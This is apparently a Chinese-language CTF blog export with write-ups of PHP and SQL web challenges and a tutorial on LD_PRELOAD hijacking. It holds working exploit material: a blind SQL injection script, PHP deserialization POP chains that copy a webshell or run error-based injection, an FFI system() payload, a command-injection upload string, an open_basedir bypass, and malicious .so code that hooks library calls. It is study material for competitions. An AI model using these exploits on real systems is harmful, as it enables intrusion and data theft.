    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h1><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220321144025.png"></p>
<p>开进去就是登入界面,根据提示我们访问hint.md</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220321144510.png"></p>
<p>可以看到部分源码，可以看出过滤了空格括号，union和binaty</p>
<p>我们可以想到用regexp盲注但是我们不知道账户</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220321145354.png"></p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220321145417.png"></p>
<p>我们只有两种状态码，sql语句报错的500，和查询无果的401，而且（）被过滤不能用时间盲注，那么我们只能去构造一个sql语句让正确时401，错误时500</p>
<p>playload:1’||case’1’when<code>password</code>like’{}%’collate’utf8mb4_0900_as_cs’then’1’else<del>1+</del>1+’0’end=’0”</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220321150747.png"></p>
<p>可以看到else部分的是一个溢出</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests,string</span><br><span class="line">j=<span class="string">&#x27;&#x27;</span></span><br><span class="line">url=<span class="string">&quot;http://47.107.231.226:27395/login&quot;</span></span><br><span class="line"><span class="comment"># playload=&quot;1&#x27;||case&#x27;1&#x27;when`username`like&#x27;&#123;&#125;%&#x27;collate&#x27;utf8mb4_0900_as_cs&#x27;then&#x27;aaa&#x27;regexp&#x27;^a&#x27;else~0+~0+&#x27;1&#x27;end=&#x27;0&quot;</span></span><br><span class="line">playload=<span class="string">&quot;1&#x27;||case&#x27;1&#x27;when`password`like&#x27;&#123;&#125;%&#x27;collate&#x27;utf8mb4_0900_as_cs&#x27;then&#x27;1&#x27;else~1+~1+&#x27;0&#x27;end=&#x27;0&quot;</span></span><br><span class="line"><span class="built_in">list</span> = string.ascii_letters + string.digits + <span class="string">&#x27;^$!_%@&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">            nplayload=playload.<span class="built_in">format</span>(j+i)</span><br><span class="line">            <span class="comment"># print(nplayload)</span></span><br><span class="line">            date=&#123;</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="number">123</span>,</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:nplayload</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment"># print(nplayload)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;401&#x27;</span> <span class="keyword">in</span> requests.post(url,data=date).text:</span><br><span class="line">                j+=i</span><br><span class="line">                <span class="built_in">print</span>(nplayload)</span><br><span class="line">                <span class="built_in">print</span>(j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220321153531.png"></p>
<p>拿到flag</p>
<h1 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h1><p>反序列化</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220323143936.png"></p>
<p>config.php中有flag</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220323144035.png"></p>
<p>profile.php中有file_get_contents，我们要把$profile[‘photo’]的值换成config.php,$profile[‘photo’]的值是反序列化$profile来的</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220323162515.png"></p>
<p>在updata.php里有过滤,在第三个过滤处用了||所以可以用数组绕过</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220323170953.png"></p>
<p>在fitter这有字符串的替换</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220323171405.png"></p>
<p>他是先序列化再替换，所以可以用被替换5个字母的单词进行一个溢出，</p>
<p>playlood=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere”;}s:5:”photo”;s:10:”config.php”;}</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220323170528.png"></p>
<p>拿到flag</p>
<h1 id="强网杯-2019-Upload"><a href="#强网杯-2019-Upload" class="headerlink" title="[强网杯 2019]Upload"></a>[强网杯 2019]Upload</h1><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220324154146.png"></p>
<p>在profile.php中创建了index类</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220324155955.png"></p>
<p>还有call和get函数except我们可控</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220324160134.png"></p>
<p>可以在register的destruct触发__get然后用__<em>get触发</em>_call</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220324161558.png"></p>
<p>这里可以更改文件名但要过两个条件判断，事先上传文件就行了</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220324164831.png"></p>
<p>在index里有反序列化cookie</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$registed</span> =<span class="number">0</span>;<span class="comment">//目的是过destruct里的if;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$checker</span> =<span class="number">0</span> ;<span class="comment">//目的是绕过index类的检查，防止退出程序</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename_tmp</span>=<span class="string">&quot;./upload/cc551ab005b2e60fbdc88de809b2c4b1/fb5c81ed3a220004b71069645f112867.png&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$upload_menu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;upload/shell.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>=<span class="number">1</span>;<span class="comment">//目的是过if来调用复制webshell</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$except</span>=<span class="keyword">array</span>(<span class="string">&quot;index&quot;</span>=&gt;<span class="string">&quot;upload_img&quot;</span>);<span class="comment">//目的是通过__get()魔术方法调用upload_Img函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> Register();</span><br><span class="line"><span class="variable">$a</span>-&gt;checker = <span class="keyword">new</span> Profile();<span class="comment">//目的是调用POP链</span></span><br><span class="line"><span class="variable">$a</span>-&gt;checker-&gt;checker=<span class="number">0</span>;<span class="comment">//调用pop链防止退出程序</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>用brup把cooike的use的值换成我们自己的cookie</p>
<p>拿到flag</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220324172131.png"></p>
<h1 id="红明谷CTF-2021-EasyTP"><a href="#红明谷CTF-2021-EasyTP" class="headerlink" title="[红明谷CTF 2021]EasyTP"></a>[红明谷CTF 2021]EasyTP</h1><p>thinkphp3反序列化漏洞</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325123420.png"></p>
<p>在controller找到入口</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325124239.png"></p>
<p>这个折构函数img可控</p>
<p>并用了destroy方法</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325124652.png"></p>
<p>看destroy方法调用的delete，继续跟近</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325125040.png"></p>
<p>在model找到可以利用的函数</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325125445.png"></p>
<p>getpk方法就是$this-&gt;pk的值，我们可控</p>
<p>在这我们可以再调用一次delete这次是有参数的</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325134013.png"></p>
<p>可以用connect连接数据库</p>
<p>有报错注入拿到flag</p>
<p>poc</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; <span class="literal">true</span> <span class="comment">// 开启才能读取文件</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;test&quot;</span>, <span class="comment">// 可换成任一存在的库</span></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,</span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,</span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span> <span class="comment">// BUU环境密码为root</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>\<span class="title">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;img = <span class="keyword">new</span> Memcache();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>\<span class="title">Session</span>\<span class="title">Driver</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Model();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Think</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Think</span>\<span class="title">Db</span>\<span class="title">Driver</span>\<span class="title">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> Mysql();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;data[<span class="keyword">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="comment">//查看数据库名称</span></span><br><span class="line">                <span class="comment">// &quot;table&quot; =&gt; &quot;mysql.user where updatexml(1,concat(0x7e,mid((select(group_concat(schema_name))from(information_schema.schemata)),30),0x7e),1)#&quot;,</span></span><br><span class="line">                <span class="comment">//数据库名称：&#x27;~information_schema,mysql,performance_schema,sys,test~&#x27;</span></span><br><span class="line">                <span class="comment">//一次能够读取的长度有限，分两次读取数据  使用mid函数分开读取</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//查表名</span></span><br><span class="line">                <span class="comment">// &quot;table&quot; =&gt; &quot;mysql.user where updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1)#&quot;,</span></span><br><span class="line">                <span class="comment">// ~flag,users~</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 查列名</span></span><br><span class="line">                <span class="comment">//&quot;table&quot; =&gt; &quot;mysql.user where updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),0x7e),1)#&quot;,</span></span><br><span class="line">                <span class="comment">//~flag~</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">//查字段值</span></span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;mysql.user where updatexml(1,concat(0x7e,mid((select`*`from`flag`),1),0x7e),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br><span class="line">                </span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Think</span>\<span class="title">Image</span>\<span class="title">Driver</span>\<span class="title">Imagick</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h1><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325151610.png"></p>
<p>写文件加简单过滤</p>
<p>用短标签绕过php用%09绕过空格用`号绕过eval</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?action=upload&amp;data=<span class="meta">&lt;?</span><span class="keyword">echo</span>%<span class="number">09</span>`cat%<span class="number">09</span>/flllllll1112222222lag`<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h1 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h1><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325154517.png"></p>
<p>可以写入文件但是有过滤只能用a-z的字母,可以向.hatccess写木马，.hatccess文件会自己绕过</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325154447.png"></p>
<p>拿到flag</p>
<h1 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h1><p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325182602.png">禁用了命令执行的函数</p>
<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325183232.png"></p>
<p>读文件preload的源码，有个反序列化命令执行，比较简单playload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI::cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;int system(char *command);&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;run&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__construct&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$a</span>)); </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Ranga10k/picture.jpg/main/20220325183804.png"></p>
<p>拿到flag</p>
]]></content>
  </entry>
  <entry>
    <title>php-fpm</title>
    <url>/2022/08/21/php-fpm/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="例题-蓝帽杯-2021-One-Pointer-PHP"><a href="#例题-蓝帽杯-2021-One-Pointer-PHP" class="headerlink" title="例题[蓝帽杯 2021]One Pointer PHP"></a>例题[蓝帽杯 2021]One Pointer PHP</h1><p>题目给了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span>=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$u</span>=<span class="keyword">new</span> User();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到我们能rce但是要$count[]=1不成立，而对于count数组只有一组数据，</p>
<p>但是在对count数组填入数据时，做了一个下表递增的操作，而下表的值是我们可以控制的，这里就有了个数组越界</p>
<p>我们就可以让$user-&gt;count的值等于9223372036854775806自增后成了3A9223372036854775807就会产生数组越界我们就能命令执行了</p>
<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220821112824.png"></p>
<p>可以看到执行了phpinfo</p>
<p>但是他设置了很多的disable_function</p>
<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220821113112.png"></p>
<p>并且也设置了OPEN_BASEDIR</p>
<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220821113212.png"></p>
<p>我们可以绕过open_basedir读文件</p>
<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220821113701.png"></p>
<p>playload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir(&#x27;123&#x27;); </span><br><span class="line">chdir(&#x27;123&#x27;);</span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;);</span><br><span class="line">chdir(&#x27;..&#x27;); </span><br><span class="line">ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);</span><br><span class="line">var_dump(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>

<p>但是不能读取flag，那么应该是要提权</p>
]]></content>
  </entry>
  <entry>
    <title>LD_PRELOAD</title>
    <url>/2022/08/20/LD-PRELOAD_rec/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>LD_PRELOAD 是 Linux 系统中的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库，我们可以上传一个恶意的.so文件，让LD_PRELOAD指向我们上传的恶意文件，就能在执行系统命令的时候，执行我们的恶意代码</p>
<p>先查看ls命令会调用什么库函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readelf -Ws /usr/bin/ls</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ranga10k/picture.jpg/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202022-08-21%20172625.png?raw=true">我们这里选择的是strncmp</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strncmp</span><span class="params">()</span> </span>&#123;   </span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用gcc编译成.so文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC 8.c -o 8.so</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/ranga1ok/pic/raw/master/20220819204850.png">可以看到这里的编译出现看错误，我们根据报错对我们的.c文件进行修改</p>
<p>之后把LD_PRELOAD的值改成.so文件的值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export LD_PRELOAD=$PWD/8.so</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ranga10k/picture.jpg/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202022-08-21%20172957.png?raw=true">可以看到我们在执行ls命令的时候，同时也执行了id的命令</p>
<p>我们可以使用 <em>_attribute</em>_((constructor))修饰符来是我们的恶意文件，让我们的恶意文件能在动态链接被加载的调用，相比于之前的在命令加载函数的时候，更加有广泛性</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo 1&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ranga10k/picture.jpg/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202022-08-21%20173110.png?raw=true"></p>
<p>可以看到ls和hello都执行了echo 1的命令</p>
<p>[虎符CTF 2022]ezphp</p>
<p><img src="https://github.com/Ranga10k/picture.jpg/blob/main/%E8%9E%A2%E5%B9%95%E6%93%B7%E5%8F%96%E7%95%AB%E9%9D%A2%202022-08-21%20173308.png?raw=true"></p>
<p>可以看到代码有putenv可以更改环境变量,而且后面使用了echo命令，我们就可以上传一个恶意的.so文件，用LD_PRELOAD去包含他，就可以执行我们的命令了</p>
<p>但是没有文件上传的地方，这里就要用到一个nginx服务器特性，在我们上传大文件的时候，会造成缓冲区溢出，nginx就会生成一个临时文件储存我们传输的大文件，所以我们要构造一个很大的so文件，让后再去包含他，写一个webshell</p>
<p>但是我不到为什么包含不到.so文件没有复现成功</p>
]]></content>
  </entry>
</search>
